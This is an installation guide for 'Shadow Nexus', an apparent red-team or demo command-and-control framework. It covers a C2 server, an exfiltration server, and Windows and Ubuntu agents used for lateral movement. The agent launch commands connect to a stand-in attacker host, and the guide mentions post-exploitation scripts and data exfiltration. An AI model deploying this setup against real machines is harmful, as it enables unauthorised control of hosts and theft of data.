# Shadow Nexus Installation Guide
This guide explains how to set up the entire Shadow Nexus project across three different
machines: the C2 server, a Windows agent, and a secondary Ubuntu agent for lateral
movement.
---
## 1. evil-ubuntu (C2 Server Setup)
### A. Install dependencies
```bash
sudo apt update && sudo apt install -y python3 python3-pip unzip
cd ~/ # or the desired directory
unzip Shadow-Nexus-main\ \(3\).zip
cd Shadow-Nexus-main/server
pip3 install -r requirements.txt
```
### B. Run the C2 server

```bash
python3 app.py
```
Strogly recomend not running in background as logs may be very useful for debugging purposes
---
### C. Run exfil server
Use this server to allocate exfiltration server, it's stored under the folder utils in this repo, please respect the directory tree

```bash
python3 server.py
```
> Tip: Use `nohup python3 app.py &` to run it in the background.
## ? 2. agent-win (Windows Agent Setup)
### A. Install Python dependencies

```powershell
cd C:\path\to\Shadow-Nexus-main\agent
pip install -r requirements\windows\requirements.txt
```
### B. Start the agent
```powershell
python advanced_agent.py --server http://<evil-ubuntu-IP>:5000
```
> Use `--debug` for verbose logging
---
## 3. Pivot-ubuntu (Secondary Ubuntu Agent Setup)
### A. Prepare Python environment
```bash
sudo apt update && sudo apt install -y python3 python3-pip
```
### B. Install agent dependencies
```bash
cd ~/path/to/Shadow-Nexus-main/agent
pip3 install -r requirements/ubuntu/requirements.txt
```
### C. Start the agent
```bash
python3 advanced_agent.py --server http://<evil-ubuntu-IP>:5000
```
> Use a custom domain instead of IP for attribution, you may need to change the /etc/hosts to do that
---
## Structure Overview
- `server/`  Contains the Flask C2 server.
- `agent/`  Contains the multi-platform agent.
- `server/scripts/`  Post-exploitation scripts, this are used by the attack path actions.
- `utils/` Exfiltration server, the recon tasks exfiltrate data to demo data exfiltration
- `requirements/`  Environment-specific dependencies.
---
## Tips
- Ensure all machines can communicate over the network.
- Use different agent IDs for clarity when managing multiple agents.
- Log files are created per-agent for traceability.
---
Made with love by the Shadow Nexus APT ;)
